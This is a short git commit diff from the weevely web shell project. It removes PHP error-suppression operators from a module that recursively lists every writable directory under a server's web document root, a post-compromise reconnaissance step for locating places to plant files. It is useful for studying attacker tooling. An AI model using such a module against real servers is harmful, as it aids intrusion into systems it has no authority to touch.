f9a5462d839757248dc1e6ca58ea2f516ef52d0b
emilio.pinn <emilio.pinn@5205769a-2ae6-11df-b744-258d51847b74>
2010-03-10 01:09:46 +0000

    git-svn-id: http://weevely.googlecode.com/svn/trunk@39 5205769a-2ae6-11df-b744-258d51847b74

--- modules/search_writable_path.php
+++ modules/search_writable_path.php
@@ -1,14 +1,14 @@
 //Author:  Carlo Satta
 //Description: Print all writable directories.
-@c($_SERVER['DOCUMENT_ROOT']);
+c($_SERVER['DOCUMENT_ROOT']);
 function c($d){
-	$h = @opendir($d);
-	while ($f = @readdir($h)) {
+	$h = opendir($d);
+	while ($f = readdir($h)) {
 		$df=$d.'/'.$f; 
 		if((is_dir($df))&&($f!='.')&&($f!='..')){
-			if(@is_writable($df)) echo "Writable: ".@str_replace($_SERVER['DOCUMENT_ROOT'],'',$df)."\n";
-			@c($df);
+			if(is_writable($df)) echo "Writable: ".str_replace($_SERVER['DOCUMENT_ROOT'],'',$df)."\n";
+			c($df);
 		}
 	}
-	@closedir($h);
+	closedir($h);
 }
